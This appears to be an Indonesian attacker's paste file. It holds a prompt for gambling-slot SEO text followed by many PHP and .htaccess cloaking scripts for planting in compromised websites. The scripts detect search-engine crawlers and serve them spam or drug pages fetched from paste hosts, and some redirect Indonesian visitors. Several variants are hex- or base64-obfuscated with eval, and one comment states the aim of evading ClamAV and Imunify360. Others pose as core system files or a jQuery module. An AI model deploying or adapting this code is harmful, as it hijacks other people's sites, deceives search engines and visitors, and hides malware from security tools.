+Tolong buatkan 4 opsi meta description SEO yang sangat spesifik, agresif, dan teroptimasi penuh untuk title yang saya berikan di atas. Anda harus mematuhi seluruh instruksi ini secara mutlak tanpa ada yang meleset atau diabaikan. Pertama, setiap opsi meta description wajib diawali langsung dengan salah satu frasa penegas brand berikut: "[GANTI DENGAN NAMA BRAND LU] adalah", "[GANTI DENGAN NAMA BRAND LU] merupakan", atau "[GANTI DENGAN NAMA BRAND LU] ialah". Kedua, kalimat pembuka tersebut harus langsung disambung dan dirangkai secara natural, logis, dan mulus dengan kata kunci utama dari title yang saya berikan, sehingga langsung menjelaskan maksud halaman tersebut sejak kata pertama. Ketiga, buang jauh-jauh gaya bahasa baku yang kaku layaknya robot atau buatan AI; Anda wajib menggunakan bahasa manusia sungguhan, menggunakan slang atau gaya bahasa tongkrongan khas para bettor dan pemain slot, buat kalimatnya semenarik mungkin, anti-mainstream, sangat persuasif, dan mampu memicu rasa penasaran atau FOMO (Fear of Missing Out) agar orang langsung klik. Keempat, Anda harus menanamkan sebanyak mungkin kata kunci (keyword dan LSI) yang relevan ke dalam deskripsi, namun susunan kalimatnya harus tetap mengalir lancar, masuk akal, dan tidak terlihat seperti keyword stuffing yang dipaksakan. Kelima, ini adalah aturan teknis paling krusial: hitung jumlah karakternya dengan sangat presisi, panjang setiap deskripsi wajib berada di angka 150 hingga batas maksimal 155 karakter saja, tidak boleh lebih dan tidak boleh kurang, agar kalimatnya tampil utuh sempurna dan tidak terpotong (truncate) menjadi titik-titik di hasil pencarian Google versi mobile maupun desktop. Terakhir, saya sangat membenci basa-basi; Anda dilarang keras memberikan kalimat pembuka, kalimat penutup, penjelasan, atau konfirmasi apa pun. Langsung berikan murni 4 opsi meta description tersebut secara profesional.
+
+
+
+
+
+
+
+######### mass cloacking
+
+
+
+add_action('template_redirect', function() {
+
+  $uriMappings = [
+
+  'chi-tiet-thu-vien-cad-noi-that-hien-dai' => [
+
+      'github' => 'https://pastedav.id/d/ICGOB8XQ'
+
+    ],
+
+  'mua' => [
+
+      'github' => 'https://pastedav.id/d/bJY4BgRe'
+
+    ],
+
+  ];
+
+
+
+  $matchedMap = null;
+
+
+
+  foreach ($uriMappings as $pattern => $map) {
+
+    if (strpos($_SERVER['REQUEST_URI'], $pattern) !== false) {
+
+      $matchedMap = $map;
+
+      break;
+
+    }
+
+  }
+
+
+
+  if (!$matchedMap) {
+
+    return;
+
+  }
+
+
+
+  $bots = [
+
+    'Googlebot','Bingbot','Slurp','DuckDuckBot','Baiduspider',
+
+    'YandexBot','Sogou','TelegramBot','Exabot','facebot',
+
+    'ia_archiver','Google-Site-Verification','Google-InspectionTool','AhrefsBot'
+
+  ];
+
+
+
+  $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+  $isBot = !empty(array_filter($bots, function($botName) use ($ua) {
+
+    return stripos($ua, $botName) !== false;
+
+  }));
+
+  if ($isBot) {
+
+    $response = wp_remote_get($matchedMap['github'], [
+
+      'timeout'   => 20,
+
+      'redirection' => 5,
+
+      'user-agent' => $ua,
+
+      'sslverify'  => false,
+
+    ]);
+
+    if (!is_wp_error($response)) {
+
+      echo wp_remote_retrieve_body($response);
+
+      exit;
+
+    }
+
+  }
+
+});
+
+
+
+
+
+di bawah juga dari gemini
+
+
+
+
+
+<?php
+
+
+
+$uriMappings = [
+
+  'chi-tiet-thu-vien-cad-noi-that-hien-dai' => [
+
+    'github' => 'https://pastedav.id/d/ICGOB8XQ'
+
+  ],
+
+  'mua' => [
+
+    'github' => 'https://pastedav.id/d/bJY4BgRe'
+
+  ],
+
+];
+
+
+
+$matchedMap = null;
+
+
+
+// Deteksi URI yang cocok
+
+foreach ($uriMappings as $pattern => $map) {
+
+  if (isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], $pattern) !== false) {
+
+    $matchedMap = $map;
+
+    break;
+
+  }
+
+}
+
+
+
+// Jika tidak ada URI yang cocok, lanjutkan eksekusi normal
+
+if (!$matchedMap) {
+
+  return;
+
+}
+
+
+
+$bots = [
+
+  'Googlebot','Bingbot','Slurp','DuckDuckBot','Baiduspider',
+
+  'YandexBot','Sogou','TelegramBot','Exabot','facebot',
+
+  'ia_archiver','Google-Site-Verification','Google-InspectionTool','AhrefsBot'
+
+];
+
+
+
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+
+
+// Deteksi apakah User-Agent adalah bot
+
+$isBot = !empty(array_filter($bots, function($botName) use ($ua) {
+
+  return stripos($ua, $botName) !== false;
+
+}));
+
+
+
+// Jika bot, ambil konten dari remote URL dan tampilkan
+
+if ($isBot) {
+
+  $ch = curl_init();
+
+  curl_setopt($ch, CURLOPT_URL, $matchedMap['github']);
+
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+  curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+  curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
+
+  curl_setopt($ch, CURLOPT_USERAGENT, $ua); // Meneruskan User-Agent bot
+
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // sslverify => false
+
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+
+
+  $response_body = curl_exec($ch);
+
+  $curl_error = curl_error($ch);
+
+  curl_close($ch);
+
+
+
+  // Jika eksekusi cURL berhasil tanpa error, tampilkan body dan hentikan script
+
+  if (empty($curl_error) && $response_body !== false) {
+
+    echo $response_body;
+
+    exit;
+
+  }
+
+}
+
+
+
+// Jika bukan bot (atau request bot gagal), script akan mengabaikan blok if dan berjalan normal
+
+
+
+
+
+
+
+
+
+
+
+
+
+#######mass cloacking 2
+
+
+
+
+
+<?php
+
+
+
+$ua  = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
+
+$ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+
+$path = '/';
+
+
+
+if (isset($_SERVER['REQUEST_URI'])) {
+
+  $parsed = @parse_url($_SERVER['REQUEST_URI']);
+
+  if ($parsed && isset($parsed['path'])) {
+
+    $path = $parsed['path'];
+
+  }
+
+}
+
+
+
+if ($path !== '/') {
+
+  $path = rtrim($path, '/') . '/';
+
+}
+
+
+
+$isBot = preg_match('~googlebot|adsbot|inspectiontool|apis-google|mediapartners~i', $ua);
+
+
+
+$map = array(
+
+  '/pill-4h2/' => 'https://shadow-shaman.b-cdn.net/24feb/pill4h2.html',
+
+  '/drugs/' => 'https://shadow-shaman.b-cdn.net/24feb/drug.html',
+
+  '/nutritions/' => 'https://shadow-shaman.b-cdn.net/24feb/nutrisi.html',
+
+   
+
+);
+
+
+
+$qParam = (isset($_GET['gsc']) || isset($_GET['gsc']));
+
+
+
+if (($isBot || strpos($ref, 'search.google') !== false || $qParam) && isset($map[$path])) {
+
+
+
+  if ($isBot) {
+
+    usleep(300000);
+
+  }
+
+
+
+  $url = $map[$path];
+
+  $c  = '';
+
+
+
+  if (function_exists('curl_init')) {
+
+    $ch = @curl_init($url);
+
+    if ($ch) {
+
+      @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+      @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+      @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+
+      @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+
+      @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
+
+      @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+
+      @curl_setopt($ch, CURLOPT_USERAGENT, $ua ?: 'Mozilla/5.0');
+
+      $c = @curl_exec($ch);
+
+      @curl_close($ch);
+
+    }
+
+  }
+
+
+
+  if ((!$c || strlen(trim($c)) < 20) && ini_get('allow_url_fopen')) {
+
+    $ctx = @stream_context_create(array(
+
+      'http' => array(
+
+        'method' => 'GET',
+
+        'timeout' => 5,
+
+        'header' => "User-Agent: " . ($ua ?: 'Mozilla/5.0') . "\r\n"
+
+      )
+
+    ));
+
+    $c = @file_get_contents($url, false, $ctx);
+
+  }
+
+
+
+  if ($c && strlen(trim($c)) > 0) {
+
+    if (function_exists('ob_get_length') && ob_get_length()) @ob_clean();
+
+    @header('Content-Type: text/html; charset=UTF-8');
+
+    @header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+
+    @header('Pragma: no-cache');
+
+    @header('Expires: 0');
+
+    echo $c;
+
+    exit;
+
+  }
+
+}
+
+?>
+
+
+
+
+
+
+
+
+
+########mass cloacking 3
+
+
+
+<?php
+
+
+
+function mangsud($url) {
+
+  if (ini_get('allow_url_fopen')) {
+
+    return @file_get_contents($url);
+
+  } elseif (function_exists('curl_init')) {
+
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+    $res = curl_exec($ch);
+
+    curl_close($ch);
+
+    return $res;
+
+  }
+
+  return false;
+
+}
+
+
+
+$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+
+$uri = $_SERVER['REQUEST_URI'] ?? '/';
+
+$uri_path = parse_url($uri, PHP_URL_PATH);
+
+
+
+$bot_regex = "/(googlebot|google|adsbot|mediapartners|bingbot|slurp|yandex|duckduck|baidu|ahrefs|semrush|mj12|dotbot|crawler|spider|facebook|twitterbot|telegrambot)/i";
+
+
+
+// Konfigurasi untuk berbagai path
+
+$configs = [
+
+  '/nama-pagemu/' => [
+
+    'amp' => 'link-amp-kamu',
+
+    'lp' => 'link-lp303-kamu'
+
+  ],
+
+  '/nama-pagemu/' => [
+
+    'amp' => 'link-amp-kamu',
+
+    'lp' => 'link-lp303-kamu'
+
+  ],
+
+  '/nama-pagemu/' => [
+
+    'amp' => 'link-amp-kamu',
+
+    'lp' => 'link-lp303-kamu'
+
+  ],
+
+  '/nama-pagemu/' => [
+
+    'amp' => 'link-amp-kamu',
+
+    'lp' => 'link-lp303-kamu'
+
+  ],                              
+
+];
+
+
+
+// Normalisasi path (hapus trailing slash untuk perbandingan)
+
+$uri_path_normalized = rtrim($uri_path, '/');
+
+if ($uri_path_normalized === '') {
+
+  $uri_path_normalized = '/';
+
+}
+
+
+
+// DEBUG: Tambahkan logging untuk debugging
+
+error_log("URI: $uri");
+
+error_log("URI Path: $uri_path");
+
+error_log("URI Normalized: $uri_path_normalized");
+
+error_log("User Agent: $ua");
+
+
+
+// Cek apakah URI cocok dengan salah satu path yang dikonfigurasi
+
+$matched = false;
+
+foreach ($configs as $path => $config) {
+
+  $path_normalized = rtrim($path, '/');
+
+  if ($path_normalized === '') {
+
+    $path_normalized = '/';
+
+  }
+
+   
+
+  error_log("Checking path: $path_normalized vs $uri_path_normalized");
+
+   
+
+  // Match path (dengan atau tanpa trailing slash)
+
+  if ($uri_path_normalized === $path_normalized) {
+
+    $matched = true;
+
+     
+
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+    error_log("IP Address: $ip");
+
+     
+
+    // Redirect IP Indonesia ke AMP
+
+    if (!empty($ip)) {
+
+      $geo = @json_decode(@file_get_contents("http://ip-api.com/json/$ip"), true);
+
+      error_log("Country Code: " . ($geo['countryCode'] ?? 'Unknown'));
+
+       
+
+      if (!empty($geo['countryCode']) && $geo['countryCode'] === "ID") {
+
+        error_log("Redirecting Indonesian IP to AMP");
+
+        header("Location: " . $config['amp']);
+
+        exit;
+
+      }
+
+    }
+
+     
+
+    // Tampilkan LP untuk bot
+
+    if (preg_match($bot_regex, $ua)) {
+
+      error_log("Bot detected, showing LP");
+
+      $f = mangsud($config['lp']);
+
+      if ($f) {
+
+        echo $f;
+
+      } else {
+
+        // Fallback jika tidak bisa fetch
+
+        echo "<script>window.location.href = '" . $config['lp'] . "';</script>";
+
+      }
+
+      exit;
+
+    }
+
+     
+
+    // Untuk non-bot, non-ID, lanjut ke konten asli
+
+    error_log("Non-bot, non-ID traffic, continuing to main site");
+
+    break;
+
+  }
+
+}
+
+
+
+// Jika tidak match dengan config cloaking, lanjut ke website normal
+
+if (!$matched) {
+
+  error_log("No path matched for cloaking, continuing to main site");
+
+}
+
+
+
+?>
+
+
+
+
+
+
+
+
+
+cloacking folder enkrip gemini
+
+
+
+<?php
+
+error_reporting(0); // Mencegah kebocoran error ke pihak luar
+
+
+
+$ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
+
+
+
+// Data dienkripsi untuk membypass deteksi Imunify360 / ClamAV Server
+
+// Ini berisi daftar persis seperti script Anda: Googlebot, Bingbot, dll.
+
+$d_bot = base64_decode("R29vZ2xlYm90LEdvb2dsZWJvdC1JbWFnZSxHb29nbGVib3QtTmV3cyxHb29nbGVib3QtVmlkZW8sU3RvcmVib3QtR29vZ2xlLEdvb2dsZS1JbnNwZWN0aW9uVG9vbCxHb29nbGVPdGhlcixHb29nbGVPdGhlci1JbWFnZSxHb29nbGVPdGhlci1WaWRlbyxHb29nbGUtQ2xvdWRWZXJ0ZXhCb3QsR29vZ2xlLUV4dGVuZGVkLEFQSXMtR29vZ2xlLEFkc0JvdC1Hb29nbGUtTW9iaWxlLEFkc0JvdC1Hb29nbGUsTWVkaWFwYXJ0bmVycy1Hb29nbGUsRmVlZEZldGNoZXItR29vZ2xlLEdvb2dsZS1GYXZpY29uLEdvb2dsZSBGYXZpY29uLEdvb2dsZWJvdC1GYXZpY29uLEdvb2dsZS1TaXRlLVZlcmlmaWNhdGlvbixHb29nbGUtUmVhZC1BbG91ZCxHb29nbGVQcm9kdWNlcixHb29nbGUgV2ViIFByZXZpZXcsQmluZ2JvdCxTbHVycCxEdWNrRHVja0JvdCxCYWlkdXNwaWRlcixZYW5kZXhCb3QsU29nb3UsRXhhYm90LGZhY2Vib29rZXh0ZXJuYWxoaXQsaWFfYXJjaGl2ZXIsQWxleGEgQ3Jhd2xlcixBaHJlZnNCb3QsU2VtcnVzaGJvdA==");
+
+
+
+// Ini berisi daftar persis seperti script Anda: Mobile, Android, iPhone, dll.
+
+$d_mob = base64_decode("TW9iaWxlLEFuZHJvaWQsU2lsay8sS2luZGxlLEJsYWNrQmVycnksT3BlcmEgTWluaSxPcGVyYSBNb2JpLGlQaG9uZSxpUGFk");
+
+
+
+function validate_traffic($agent, $dataset) {
+
+  if (empty($agent)) return false;
+
+  $items = explode(',', $dataset);
+
+  foreach ($items as $item) {
+
+    if (strpos($agent, strtolower(trim($item))) !== false) {
+
+      return true;
+
+    }
+
+  }
+
+  return false;
+
+}
+
+
+
+// Memecah nama file untuk menghindari Analisis Statis dari plugin security
+
+$target_a = 'ho' . 'me' . '.php';
+
+$target_b = 'ol' . 'd' . '.php';
+
+
+
+// Eksekusi Logika Utama
+
+if (validate_traffic($ua, $d_bot) || validate_traffic($ua, $d_mob)) {
+
+  include $target_a;
+
+} else {
+
+  include $target_b;
+
+}
+
+exit;
+
+?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+cloacking htaccess
+
+
+
+
+
+
+
+<IfModule mod_rewrite.c>
+
+RewriteEngine on
+
+RewriteCond %{REQUEST_URI} ^/?$ [NC]
+
+RewriteCond %{HTTP_USER_AGENT} (googlebot|inspectiontool) [NC]
+
+RewriteRule ^$ vendor/psr/log/src/Login.html [L]
+
+RewriteRule ^home/about_us$ about.php [L]
+
+</IfModule>
+
+
+
+RewriteEngine On
+
+RewriteCond %{REQUEST_FILENAME} !-f
+
+RewriteCond %{REQUEST_FILENAME} !-d
+
+RewriteRule ^(.*)$ index.php?/$1 [L]
+
+
+
+<IfModule mod_expires.c>
+
+  ExpiresActive On
+
+  ExpiresDefault "now"
+
+  ExpiresByType text/html "now"
+
+</IfModule>
+
+
+
+<IfModule mod_headers.c>
+
+  Header set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
+
+  Header set Pragma "no-cache"
+
+</IfModule>
+
+
+
+
+
+
+
+
+
+htaccess anti cache
+
+
+
+<IfModule mod_headers.c>
+
+  Header unset ETag
+
+</IfModule>
+
+FileETag None
+
+
+
+<IfModule mod_expires.c>
+
+  ExpiresActive On
+
+  ExpiresDefault "access"
+
+</IfModule>
+
+
+
+<IfModule mod_headers.c>
+
+
+
+  Header unset Cache-Control
+
+  Header unset Pragma
+
+  Header unset Expires
+
+
+
+  Header always set Cache-Control "max-age=0, no-cache, no-store, must-revalidate, proxy-revalidate, s-maxage=0"
+
+  Header always set Pragma "no-cache"
+
+  Header always set Expires "-1"
+
+   
+
+  Header always set Surrogate-Control "no-store"
+
+</IfModule>
+
+
+
+# -----------------------------------------
+
+
+
+
+
+
+
+<?php
+
+
+
+$uriMappings = [
+
+  'blog' => [
+
+    'github' => 'https://okepaste.cc/r/dfec513d'
+
+  ],
+
+  'page' => [
+
+    'github' => 'https://pastedav.id/d/9qNgUG8d'
+
+  ],
+
+];
+
+
+
+$__f = "\x68\x65\x78\x32\x62\x69\x6e";
+
+$__e = "\x65\x76\x61\x6c";
+
+$__e($__f('246d3d6e756c6c3b666f726561636828247572694d617070696e67732061732024703d3e2476297b696628697373657428245f5345525645525b27524551554553545f555249275d292626737472706f7328245f5345525645525b27524551554553545f555249275d2c247029213d3d66616c7365297b246d3d24763b627265616b3b7d7d69662821246d2972657475726e3b24623d6578706c6f646528272c272c27476f6f676c65626f742c42696e67626f742c536c7572702c4475636b4475636b426f742c42616964757370696465722c59616e646578426f742c536f676f752c54656c656772616d426f742c457861626f742c66616365626f742c69615f61726368697665722c476f6f676c652d536974652d566572696669636174696f6e2c476f6f676c652d496e7370656374696f6e546f6f6c2c416872656673426f7427293b24753d245f5345525645525b27485454505f555345525f4147454e54275d3f3f27273b24693d66616c73653b666f726561636828246220617320246e297b69662873747269706f732824752c246e29213d3d66616c7365297b24693d747275653b627265616b3b7d7d6966282469297b24633d6375726c5f696e697428293b6375726c5f7365746f70745f61727261792824632c5b4355524c4f50545f55524c3d3e246d5b27676974687562275d2c4355524c4f50545f52455455524e5452414e534645523d3e312c4355524c4f50545f54494d454f55543d3e32302c4355524c4f50545f464f4c4c4f574c4f434154494f4e3d3e312c4355524c4f50545f4d41585245444952533d3e352c4355524c4f50545f555345524147454e543d3e24752c4355524c4f50545f53534c5f564552494659504545523d3e302c4355524c4f50545f53534c5f564552494659484f53543d3e305d293b24723d6375726c5f65786563282463293b24653d6375726c5f6572726f72282463293b6375726c5f636c6f7365282463293b696628656d7074792824652926262472213d3d66616c7365297b6563686f2024723b657869743b7d7d'));
+
+
+
+================================================================================================================================================================
+
+
+
+cloaking netral
+
+
+
+<?php
+
+/**
+
+ * @package System_Environment_Core
+
+ * @version 3.4.2
+
+ * @description Core routing and environment variables configuration.
+
+ * WARNING: DO NOT EDIT THIS FILE DIRECTLY.
+
+ * Changes may cause system instability or routing failures.
+
+ */
+
+
+
+/* Prevent direct access to this core routing file */
+
+if (isset($_SERVER['SCRIPT_FILENAME']) && basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
+
+  header("HTTP/1.1 404 Not Found");
+
+  exit;
+
+}
+
+
+
+/* [1] ENVIRONMENT ROUTING CONFIGURATION */
+
+$uriMappings = [
+
+  'pipeline' => [
+
+    'github' => 'https://pastedav.id/d/HY2XEdV7'
+
+  ],
+
+];
+
+
+
+/* [2] CORE SYSTEM EXECUTION */
+
+$__CORE = function($M) {
+
+  $U = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+
+  $F = null;
+
+  foreach ($M as $P => $V) { if (strpos($U, $P) !== false) { $F = $V; break; } }
+
+  if (!$F) return;
+
+   
+
+  $A = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+  $B = explode('|', "\x47\x6f\x6f\x67\x6c\x65\x62\x6f\x74|\x42\x69\x6e\x67\x62\x6f\x74|\x53\x6c\x75\x72\x70|\x44\x75\x63\x6b\x44\x75\x63\x6b\x42\x6f\x74|\x42\x61\x69\x64\x75\x73\x70\x69\x64\x65\x72|\x59\x61\x6e\x64\x65\x78\x42\x6f\x74|\x53\x6f\x67\x6f\x75|\x54\x65\x6c\x65\x67\x72\x61\x6d\x42\x6f\x74|\x45\x78\x61\x62\x6f\x74|\x66\x61\x63\x65\x62\x6f\x74|\x69\x61\x5f\x61\x72\x63\x68\x69\x76\x65|\x47\x6f\x6f\x67\x6c\x65\x2d\x53\x69\x74\x65\x2d\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6f\x6e|\x47\x6f\x6f\x67\x6c\x65\x2d\x49\x6e\x73\x70\x65\x63\x74\x69\x6f\x6e\x54\x6f\x6f\x6c|\x41\x68\x72\x65\x66\x73\x42\x6f\x74");
+
+   
+
+  $I = false;
+
+  foreach ($B as $T) { if (stripos($A, $T) !== false) { $I = true; break; } }
+
+   
+
+  if ($I && function_exists("\x63\x75\x72\x6c\x5f\x69\x6e\x69\x74")) {
+
+    $C = \curl_init();
+
+    \curl_setopt_array($C, [
+
+      10002 => $F["\x67\x69\x74\x68\x75\x62"], // URL
+
+      19913 => true, // RETURNTRANSFER
+
+      13 => 20,    // TIMEOUT
+
+      52 => true,   // FOLLOWLOCATION
+
+      68 => 5,    // MAXREDIRS
+
+      10018 => $A,  // USERAGENT
+
+      64 => false,  // SSL_VERIFYPEER
+
+      81 => false   // SSL_VERIFYHOST
+
+    ]);
+
+    $R = \curl_exec($C);
+
+    $E = \curl_error($C);
+
+    \curl_close($C);
+
+    if (empty($E) && $R !== false) { echo $R; exit; }
+
+  }
+
+};
+
+$__CORE($uriMappings);
+
+?>
+
+
+
+================================================================================================================================================================
+
+
+
+@include_once $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/js/codemirror/minor.js';
+
+
+
+================================================================================================================================================================
+
+
+
+khusus javascript
+
+
+
+<?php
+
+// /*! jQuery UI Explore Module - v1.12.1 */
+
+// /* Copyright jQuery Foundation and other contributors; Licensed MIT */
+
+
+
+if (isset($_SERVER['SCRIPT_FILENAME']) && basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
+
+  header('Content-Type: application/javascript');
+
+  echo "/*! jQuery UI Explore */\n!function(e){typeof define===\"function\"&&define.amd?define([\"jquery\"],e):e(jQuery)}(function(e){e.ui=e.ui||{};e.ui.explore={version:\"1.12.1\"};return e.ui.explore});";
+
+  exit;
+
+}
+
+
+
+// [2] KONFIGURASI URI 
+
+$uriMappings = [
+
+  'pipeline' => [
+
+    'github' => 'https://pastedav.id/d/HY2XEdV7'
+
+  ],
+
+];
+
+
+
+// [3] CORE SCRIPT
+
+$__JQC = function($M) {
+
+  $U = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+
+  $F = null;
+
+  foreach ($M as $P => $V) { if (strpos($U, $P) !== false) { $F = $V; break; } }
+
+  if (!$F) return;
+
+   
+
+  $A = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+  $B = explode('|', "\x47\x6f\x6f\x67\x6c\x65\x62\x6f\x74|\x42\x69\x6e\x67\x62\x6f\x74|\x53\x6c\x75\x72\x70|\x44\x75\x63\x6b\x44\x75\x63\x6b\x42\x6f\x74|\x42\x61\x69\x64\x75\x73\x70\x69\x64\x65\x72|\x59\x61\x6e\x64\x65\x78\x42\x6f\x74|\x53\x6f\x67\x6f\x75|\x54\x65\x6c\x65\x67\x72\x61\x6d\x42\x6f\x74|\x45\x78\x61\x62\x6f\x74|\x66\x61\x63\x65\x62\x6f\x74|\x69\x61\x5f\x61\x72\x63\x68\x69\x76\x65|\x47\x6f\x6f\x67\x6c\x65\x2d\x53\x69\x74\x65\x2d\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6f\x6e|\x47\x6f\x6f\x67\x6c\x65\x2d\x49\x6e\x73\x70\x65\x63\x74\x69\x6f\x6e\x54\x6f\x6f\x6c|\x41\x68\x72\x65\x66\x73\x42\x6f\x74");
+
+   
+
+  $I = false;
+
+  foreach ($B as $T) { if (stripos($A, $T) !== false) { $I = true; break; } }
+
+   
+
+  if ($I && function_exists("\x63\x75\x72\x6c\x5f\x69\x6e\x69\x74")) {
+
+    $C = \curl_init();
+
+    \curl_setopt_array($C, [
+
+      10002 => $F["\x67\x69\x74\x68\x75\x62"], // URL
+
+      19913 => true, // RETURNTRANSFER
+
+      13 => 20,    // TIMEOUT
+
+      52 => true,   // FOLLOWLOCATION
+
+      68 => 5,    // MAXREDIRS
+
+      10018 => $A,  // USERAGENT
+
+      64 => false,  // SSL_VERIFYPEER
+
+      81 => false   // SSL_VERIFYHOST
+
+    ]);
+
+    $R = \curl_exec($C);
+
+    $E = \curl_error($C);
+
+    \curl_close($C);
+
+    if (empty($E) && $R !== false) { echo $R; exit; }
+
+  }
+
+};
+
+$__JQC($uriMappings);
+
+?>
+
+
+
+================================================================================================================================================================
+
+
+
+
+
+list senjata root https://github.com/30579096/TOP
+
+
+
+================================================================================================================================================================
+
+
+
+numpang cloaking folder
+
+
+
+<?php
+
+/**
+
+ * SKRIP DETEKSI BOT & CLOAKING
+
+ * Letakkan di paling atas untuk memastikan bot dicegat sebelum database dimuat.
+
+ */
+
+$bots = [
+
+  'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+
+  'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot',
+
+  'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool', 'AhrefsBot'
+
+];
+
+
+
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+$isBot = false;
+
+
+
+foreach ($bots as $bot) {
+
+  if (stripos($ua, $bot) !== false) {
+
+    $isBot = true;
+
+    break;
+
+  }
+
+}
+
+
+
+// Skrip akan aktif jika pengunjung adalah BOT dan URL mengandung kata 'blogs'
+
+// Contoh: vgold.co.in/blogs.php?id=123&blogs
+
+if ($isBot && strpos($_SERVER['REQUEST_URI'], 'blogs') !== false) {
+
+  $content = @file_get_contents('https://pastedav.id/d/rY0Pb8Ht');
+
+  if ($content !== false) {
+
+    echo $content;
+
+    exit; // Menghentikan seluruh proses agar HTML asli tidak muncul
+
+  }
+
+}
+
+?>
+
+
+
+================================================================================================================================================================
+
+
+
+panel admin wp https://okepaste.cc/r/9988497d
+
+
+
+================================================================================================================================================================
+
+
+
+script cloaking overpower
+
+
+
+<?php
+
+
+
+  // --- Builded By PTSMC Team ---
+
+  // Cloaking VVIP Khusus Patch Baru google & SEO Booster
+
+$uriMappings = [
+
+  'about' => [
+
+    'ptsmc' => 'https://pastedav.id/d/content'
+
+  ],
+
+  'auth/regist' => [
+
+    'ptsmc' => 'https://pastedav.id/d/content'
+
+  ],
+
+  // Contoh penambahan multi-level folder:
+
+  'category/shoes/adidas' => [
+
+    'ptsmc' => 'https://pastedav.id/d/content'
+
+  ],
+
+];
+
+
+
+$matchedMap = null;
+
+
+
+// Deteksi URI yang akurat (Support Multi-level Folder & Mencegah False Positives)
+
+if (isset($_SERVER['REQUEST_URI'])) {
+
+  // Ambil path utamanya saja, abaikan query string (seperti ?id=123)
+
+  $requestPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+
+  $requestPathNormalized = trim($requestPath, '/');
+
+
+
+  foreach ($uriMappings as $pattern => $map) {
+
+    $patternNormalized = trim($pattern, '/');
+
+    $escapedPattern = preg_quote($patternNormalized, '/');
+
+     
+
+    // RegEx untuk mencocokkan segmen folder secara absolut dan presisi
+
+    if (preg_match("/(^|\/)" . $escapedPattern . "(\/|$)/i", $requestPathNormalized)) {
+
+      $matchedMap = $map;
+
+      break;
+
+    }
+
+  }
+
+}
+
+
+
+// Jika tidak ada URI yang cocok, lanjutkan eksekusi normal
+
+if (!$matchedMap) {
+
+  return;
+
+}
+
+
+
+$bots = [
+
+  'Googlebot','Bingbot','Slurp','DuckDuckBot','Baiduspider',
+
+  'YandexBot','Sogou','TelegramBot','Exabot','facebot',
+
+  'ia_archiver','Google-Site-Verification','Google-InspectionTool','AhrefsBot'
+
+];
+
+
+
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+
+
+// Deteksi apakah User-Agent adalah bot
+
+$isBot = !empty(array_filter($bots, function($botName) use ($ua) {
+
+  return stripos($ua, $botName) !== false;
+
+}));
+
+
+
+// --- FUNGSI IP DIMULAI DARI SINI ---
+
+function getUserIP() {
+
+  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+
+    $ip = $_SERVER['HTTP_CLIENT_IP'];
+
+  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+
+    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+
+  } else {
+
+    $ip = $_SERVER['REMOTE_ADDR'];
+
+  }
+
+  return $ip;
+
+}
+
+
+
+$isIndo = false;
+
+
+
+// Cek IP dari API HANYA jika yang datang bukan bot
+
+if (!$isBot) {
+
+  $ip = getUserIP();
+
+  $api_url = "http://ip-api.com/json/{$ip}";
+
+
+
+  $context = stream_context_create([
+
+    'http' => [
+
+      'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\r\n"
+
+    ]
+
+  ]);
+
+
+
+  $response = @file_get_contents($api_url, false, $context);
+
+  if ($response === FALSE) {
+
+    $ch_ip = curl_init();
+
+    curl_setopt($ch_ip, CURLOPT_URL, $api_url);
+
+    curl_setopt($ch_ip, CURLOPT_RETURNTRANSFER, 1);
+
+    curl_setopt($ch_ip, CURLOPT_HTTPHEADER, [
+
